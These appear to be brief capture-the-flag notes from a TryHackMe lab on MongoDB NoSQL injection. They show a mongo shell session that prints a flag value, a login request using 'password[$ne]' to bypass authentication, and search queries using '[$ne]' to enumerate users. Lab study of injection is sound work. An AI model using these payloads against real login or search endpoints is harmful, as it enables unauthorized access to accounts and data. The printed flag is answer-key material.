```
mongo 
show databases
use flagdb
> db.getCollectionNames();
[ "flagColl" ]
db.flagColl.find()
{ "_id" : ObjectId("618806af0afbc09bdf42bd6a"), "flag" : "THM{8814a5e6662a9763f7df23ee59d944f9}" }

```

POST REQ TO /LOGIN 

```
username=admin&password[$ne]=blabla
```
logned 
get the flag /flag

NOSQL inject [$ne]

```
GET /search?username[$ne]=tre&role=guest
```

```
GET /search?username=mcskidy&role[$ne]=guest
```